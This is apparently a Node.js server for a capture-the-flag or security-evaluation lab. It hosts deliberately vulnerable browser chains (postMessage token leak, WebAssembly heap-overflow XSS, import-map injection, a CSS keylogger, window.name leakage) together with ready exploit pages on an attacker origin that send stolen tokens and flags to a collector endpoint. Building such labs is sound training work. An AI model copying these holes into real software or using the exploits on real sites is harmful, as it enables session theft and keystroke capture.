import express from 'express';
import { randomBytes } from 'node:crypto';
import wabtFactory from 'wabt';
import { chromium } from 'playwright';

const PORT = Number(process.env.PORT || 8094);
const ATTACK_PORT = Number(process.env.ATTACK_PORT || 8095);
const FLAGS = {
  oidc: process.env.FLAG_OIDC || 'ASTRA{oidc_logout_xsleak_1c93}',
  wasm: process.env.FLAG_WASM || 'ASTRA{wasm_linear_heap_xss_4a19}',
  speculation: process.env.FLAG_SPECULATION || 'ASTRA{speculation_cspt_8b73}',
  importmap: process.env.FLAG_IMPORTMAP || 'ASTRA{importmap_clobber_2e50}',
  shadowdom: process.env.FLAG_SHADOWDOM || 'ASTRA{shadowdom_css_keylogger_5b38}',
  sharedstorage: process.env.FLAG_SHAREDSTORAGE || 'ASTRA{sharedstorage_windowname_1d9e}',
};
const ADMIN_SESSION = randomBytes(24).toString('hex');
const collected = [];
const templates = new Map();

const app = express();
app.disable('x-powered-by');
app.use(express.json({ limit: '1mb' }));

const wasmText = `(module
  (import "env" "debug" (func $debug (param i32)))
  (memory (export "memory") 1)
  (type $cb (func (param i32)))
  (table 2 funcref)
  (func $safe (param i32))
  (elem (i32.const 0) $safe $debug)
  (func (export "overflow") (param $src i32) (param $len i32)
    (local $i i32)
    (block $done
      (loop $copy
        (br_if $done (i32.ge_u (local.get $i) (local.get $len)))
        (i32.store8
          (i32.add (i32.const 256) (local.get $i))
          (i32.load8_u (i32.add (local.get $src) (local.get $i))))
        (local.set $i (i32.add (local.get $i) (i32.const 1)))
        (br $copy))))
  (func (export "dispatch")
    (call_indirect (type $cb)
      (i32.const 276)
      (i32.load (i32.const 272)))))`;

let wasmBinary;
async function initWasm() {
  const wabt = await wabtFactory();
  const module = wabt.parseWat('browser.wat', wasmText);
  wasmBinary = module.toBinary({}).buffer;
}

function admin(req) {
  return req.headers.cookie?.split(';').some((part) => part.trim() === `admin_session=${ADMIN_SESSION}`) || false;
}

function adminPage(flag) {
  return `<!doctype html><meta charset="utf-8"><title>vault</title><div id="vault">${flag}</div>`;
}

function collectValue(value) {
  if (typeof value !== 'string' || !value) return;
  collected.push(value.slice(0, 16384));
  if (collected.length > 50) collected.splice(0, collected.length - 50);
}

app.get('/health', (_req, res) => {
  res.json({ status: 'ok', service: 'astralane-browser-target' });
});

app.get('/', (_req, res) => {
  res.json({
    service: 'astralane-browser-target',
    bot: '/bot/visit',
    collector: '/collect',
    chains: ['oidc-logout-xsleak', 'wasm-heap-overflow', 'speculation-cspt', 'importmap-clobber', 'shadowdom-keylogger', 'sharedstorage-windowname'],
  });
});

app.get('/admin', (req, res) => {
  if (!admin(req)) {
    res.status(403).type('text').send('administrator session required');
    return;
  }
  const chain = typeof req.query.chain === 'string' ? req.query.chain : 'oidc';
  res.type('html').send(adminPage(FLAGS[chain] || FLAGS.oidc));
});

app.get('/admin/oidc', (req, res) => {
  if (!admin(req)) {
    res.status(403).type('text').send('administrator session required');
    return;
  }
  res
    .type('html')
    .send(`${adminPage(FLAGS.oidc)}<script>document.cookie='id_token=${FLAGS.oidc}; path=/';</script>`);
});

app.get('/oidc/frontchannel/logout', (req, res) => {
  const cookie = req.headers.cookie || '';
  const token = cookie
    .split(';')
    .map((part) => part.trim())
    .find((part) => part.startsWith('id_token='))
    ?.slice('id_token='.length);
  if (!token) {
    res.status(403).type('text').send('no active OIDC session');
    return;
  }
  res.type('html').send(`<!doctype html><meta charset="utf-8"><script>
    navigator.serviceWorker?.register('/sw.js');
    parent.postMessage({ type: 'logout', id_token: ${JSON.stringify(token)} }, '*');
  </script>`);
});

app.get('/sw.js', (_req, res) => {
  res.type('application/javascript').send(`
    self.addEventListener('install', () => self.skipWaiting());
    self.addEventListener('activate', (event) => event.waitUntil(self.clients.claim()));
    self.addEventListener('fetch', (event) => {
      if (!event.request.url.includes('/oidc/')) return;
      event.respondWith(caches.open('oidc-v1').then(async (cache) => {
        const response = await fetch(event.request);
        cache.put(event.request, response.clone());
        return response;
      }));
    });
  `);
});

app.get('/exploit/oidc', (_req, res) => {
  res.type('html').send(`<!doctype html><meta charset="utf-8"><title>logout preview</title>
  <script>
    addEventListener('message', (event) => {
      if (event.data?.type === 'logout' && event.data.id_token) {
        fetch('/collect?data=' + encodeURIComponent(event.data.id_token));
      }
    });
    const frame = document.createElement('iframe');
    frame.src = 'http://127.0.0.1:${PORT}/oidc/frontchannel/logout';
    document.documentElement.append(frame);
  </script>`);
});

app.get('/wasm/module.wasm', (_req, res) => {
  res.type('application/wasm').send(Buffer.from(wasmBinary));
});

app.get('/wasm', (_req, res) => {
  res.type('html').send(`<!doctype html><meta charset="utf-8"><title>wasm profile</title>
  <div id="out"></div>
  <script>
    const params = new URLSearchParams(location.search);
    const payload = params.get('payload') || '';
    const encoder = new TextEncoder();
    let instance;
    const imports = {
      env: {
        debug(pointer) {
          const memory = new Uint8Array(instance.exports.memory.buffer);
          let end = pointer;
          while (memory[end]) end += 1;
          document.getElementById('out').innerHTML = new TextDecoder().decode(memory.slice(pointer, end));
        },
      },
    };
    fetch('/wasm/module.wasm').then((response) => response.arrayBuffer()).then(async (buffer) => {
      ({ instance } = await WebAssembly.instantiate(buffer, imports));
      const input = encoder.encode(payload);
      const memory = new Uint8Array(instance.exports.memory.buffer);
      const start = 512;
      memory.fill(65, start, start + 16);
      new DataView(instance.exports.memory.buffer).setUint32(start + 16, 1, true);
      memory.set(input, start + 20);
      memory[start + 20 + input.length] = 0;
      instance.exports.overflow(start, 20 + input.length + 1);
      instance.exports.dispatch();
    });
  </script>`);
});

app.get('/spa', (_req, res) => {
  res.type('html').send(`<!doctype html><meta charset="utf-8"><title>itinerary</title>
  <div id="app">loading</div>
  <script type="speculationrules">{"prerender":[{"source":"list","urls":["/spa?path=..%2Fadmin"]}]}</script>
  <script>
    const path = new URLSearchParams(location.search).get('path') || '/';
    const target = new URL(path, location.origin);
    fetch(target.pathname + target.search, { credentials: 'include' }).then((response) => response.text()).then((text) => {
      document.getElementById('app').textContent = text;
      const match = text.match(/ASTRA\\{[^}]+\\}/);
      if (match) fetch('/collect?data=' + encodeURIComponent(match[0]));
    });
  </script>`);
});

app.get('/importmap', (req, res) => {
  const map = typeof req.query.map === 'string' ? req.query.map : '{"imports":{"@auth/client":"/auth-client.js"}}';
  res.type('html').send(`<!doctype html><meta charset="utf-8"><title>account shell</title>
  <script type="importmap">${map}</script>
  <script type="module">
    import { getSession } from '@auth/client';
    getSession();
  </script>`);
});

app.get('/auth-client.js', (_req, res) => {
  res.type('application/javascript').send(`
    export async function getSession() {
      const response = await fetch('/admin?chain=importmap', { credentials: 'include' });
      const text = await response.text();
      const match = text.match(/ASTRA\\{[^}]+\\}/);
      if (match) await fetch('/collect?data=' + encodeURIComponent(match[0]));
      return { ok: response.ok };
    }
  `);
});

app.get('/evil-client.js', (_req, res) => {
  res.type('application/javascript').send(`
    export async function getSession() {
      const response = await fetch('/admin?chain=importmap', { credentials: 'include' });
      const text = await response.text();
      const match = text.match(/ASTRA\\{[^}]+\\}/);
      if (match) await fetch('/collect?data=' + encodeURIComponent(match[0]));
      return { ok: response.ok };
    }
  `);
});

function cssKeylogger() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_-';
  const rules = [];
  for (let position = 0; position < 64; position += 1) {
    for (const char of chars) {
      const escaped = char.replace(/\\/g, '\\\\').replace(/"/g, '\\"');
      rules.push(
        `::slotted(input[data-last="${escaped}"][data-pos="${position}"]) { background-image: url('/collect?c=${encodeURIComponent(char)}&p=${position}'); }`,
      );
    }
  }
  return rules.join('\n');
}

app.post('/dsd/template', (req, res) => {
  const template = typeof req.body?.template === 'string' ? req.body.template : '';
  if (!template || template.length > 900000) {
    res.status(400).json({ error: 'template is required and must be at most 900 KB' });
    return;
  }
  const token = randomBytes(12).toString('hex');
  templates.set(token, template);
  if (templates.size > 20) templates.delete(templates.keys().next().value);
  res.json({ token });
});

app.get('/dsd', (req, res) => {
  const token = typeof req.query.token === 'string' ? req.query.token : '';
  const slot = typeof req.query.slot === 'string' ? req.query.slot : '';
  const template = (token && templates.get(token)) || slot || '<slot name="vault"></slot>';
  res.type('html').send(`<!doctype html><meta charset="utf-8"><title>secure vault</title>
  <div id="host">
    <template shadowrootmode="open">${template}</template>
    <input slot="vault" id="secret" autocomplete="off">
  </div>
  <script>
    const input = document.getElementById('secret');
    input.addEventListener('input', () => {
      input.setAttribute('value', input.value);
      input.setAttribute('data-last', input.value.slice(-1));
      input.setAttribute('data-pos', String(input.value.length - 1));
    });
  </script>`);
});

app.get('/window-name/admin', (req, res) => {
  if (!admin(req)) {
    res.status(403).type('text').send('administrator session required');
    return;
  }
  res.type('html').send(`<!doctype html><meta charset="utf-8"><script>
    window.name = ${JSON.stringify(FLAGS.sharedstorage)};
    setTimeout(() => { location = 'http://127.0.0.1:${ATTACK_PORT}/window-name/return'; }, 100);
  </script>`);
});

app.get('/window-name/return', (_req, res) => {
  res.type('html').send('<!doctype html><meta charset="utf-8"><title>return</title>');
});

app.get('/exploit/window-name', (_req, res) => {
  res.type('html').send(`<!doctype html><meta charset="utf-8"><title>shared storage</title>
  <iframe id="victim" src="http://127.0.0.1:${PORT}/window-name/admin"></iframe>
  <script>
    const frame = document.getElementById('victim');
    const timer = setInterval(() => {
      try {
        const value = frame.contentWindow.name;
        if (value && value.startsWith('ASTRA{')) {
          clearInterval(timer);
          fetch('/collect?data=' + encodeURIComponent(value));
        }
      } catch {}
    }, 100);
  </script>`);
});

app.get('/exploit/speculation', (_req, res) => {
  res.type('html').send(`<!doctype html><meta charset="utf-8"><title>prerender test</title>
  <script type="speculationrules">{"prerender":[{"source":"list","urls":["/spa?path=..%2Fadmin"]}]}</script>
  <a href="/spa?path=..%2Fadmin">itinerary</a>`);
});

app.get('/collect', (req, res) => {
  collectValue(typeof req.query.data === 'string' ? req.query.data : '');
  if (typeof req.query.c === 'string' && typeof req.query.p === 'string') {
    collectValue(`${req.query.p}:${req.query.c}`);
  } else {
    collectValue(typeof req.query.c === 'string' ? req.query.c : '');
  }
  const flag = collected.find((value) => value.includes('ASTRA{')) || null;
  res.json({ ok: true, count: collected.length, items: collected, flag });
});

app.post('/collect', (req, res) => {
  collectValue(typeof req.body?.data === 'string' ? req.body.data : '');
  res.json({ ok: true, count: collected.length });
});

app.post('/collect/reset', (_req, res) => {
  collected.length = 0;
  res.json({ ok: true });
});

app.post('/bot/visit', async (req, res) => {
  const origin = req.body?.origin === '127.0.0.1' ? '127.0.0.1' : req.body?.origin === 'attack' ? '127.0.0.1' : 'localhost';
  const port = req.body?.origin === 'attack' ? ATTACK_PORT : PORT;
  const path = typeof req.body?.path === 'string' ? req.body.path : '/';
  const typeSelector = typeof req.body?.typeSelector === 'string' ? req.body.typeSelector : '';
  const typeText = req.body?.typeText === 'FLAG' ? FLAGS.shadowdom : '';
  if (!path.startsWith('/')) {
    res.status(400).json({ error: 'path must be absolute' });
    return;
  }

  let browser;
  try {
    browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
    const context = await browser.newContext();
    await context.addCookies([
      { name: 'admin_session', value: ADMIN_SESSION, domain: '127.0.0.1', path: '/' },
      { name: 'id_token', value: FLAGS.oidc, domain: '127.0.0.1', path: '/' },
    ]);
    const page = await context.newPage();
    await page.goto(`http://${origin}:${port}${path}`, { waitUntil: 'domcontentloaded', timeout: 15000 });
    if (typeSelector && typeText) {
      await page.fill(typeSelector, '');
      await page.type(typeSelector, typeText, { delay: 80 });
    }
    await page.waitForTimeout(4500);
    await browser.close();
    res.json({ ok: true, origin, path });
  } catch (error) {
    if (browser) await browser.close().catch(() => {});
    res.status(500).json({ error: String(error?.message || error) });
  }
});

app.use((error, _req, res, _next) => {
  console.error('[browser-target]', error);
  res.status(500).json({ error: 'browser target fault' });
});

const attacker = express();
attacker.disable('x-powered-by');

attacker.get('/exploit/oidc', (_req, res) => {
  res.type('html').send(`<!doctype html><meta charset="utf-8"><title>logout preview</title>
  <script>
    addEventListener('message', (event) => {
      if (event.data?.type === 'logout' && event.data.id_token) {
        fetch('/collect?data=' + encodeURIComponent(event.data.id_token));
      }
    });
    const frame = document.createElement('iframe');
    frame.src = 'http://127.0.0.1:${PORT}/oidc/frontchannel/logout';
    document.documentElement.append(frame);
  </script>`);
});

attacker.get('/exploit/window-name', (_req, res) => {
  res.type('html').send(`<!doctype html><meta charset="utf-8"><title>shared storage</title>
  <iframe id="victim" src="http://127.0.0.1:${PORT}/window-name/admin"></iframe>
  <script>
    const frame = document.getElementById('victim');
    const timer = setInterval(() => {
      try {
        const value = frame.contentWindow.name;
        if (value && value.startsWith('ASTRA{')) {
          clearInterval(timer);
          fetch('/collect?data=' + encodeURIComponent(value));
        }
      } catch {}
    }, 100);
  </script>`);
});

attacker.get('/window-name/return', (_req, res) => {
  res.type('html').send('<!doctype html><meta charset="utf-8"><title>return</title>');
});

attacker.get('/collect', (req, res) => {
  collectValue(typeof req.query.data === 'string' ? req.query.data : '');
  const flag = collected.find((value) => value.includes('ASTRA{')) || null;
  res.json({ ok: true, count: collected.length, items: collected, flag });
});

attacker.post('/collect/reset', (_req, res) => {
  collected.length = 0;
  res.json({ ok: true });
});

initWasm()
  .then(() => {
    app.listen(PORT, '0.0.0.0', () => {
      console.log(`astralane browser target listening on ${PORT}`);
    });
    attacker.listen(ATTACK_PORT, '0.0.0.0', () => {
      console.log(`astralane browser attacker origin listening on ${ATTACK_PORT}`);
    });
  })
  .catch((error) => {
    console.error('[browser-target] wasm startup failed', error);
    process.exit(1);
  });
